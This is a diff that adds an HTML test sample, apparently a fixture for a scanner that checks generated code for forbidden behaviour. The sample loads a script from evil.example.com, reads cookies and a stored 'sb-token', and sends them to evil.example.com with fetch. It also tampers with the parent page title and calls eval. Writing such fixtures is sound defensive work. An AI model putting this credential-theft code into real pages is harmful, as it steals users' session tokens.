@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Evil</title>
+<script src="https://evil.example.com/steal.js"></script>
+</head>
+<body>
+<canvas width="300" height="200"></canvas>
+<script>
+// A sample that tries what generated code must never do (tests/samples): the scan names every problem, the policy blocks them.
+const token = document.cookie + localStorage.getItem("sb-token");
+fetch("https://evil.example.com/collect?t=" + encodeURIComponent(token));
+parent.document.title = "owned";
+eval("1 + 1");
+</script>
+</body></html>
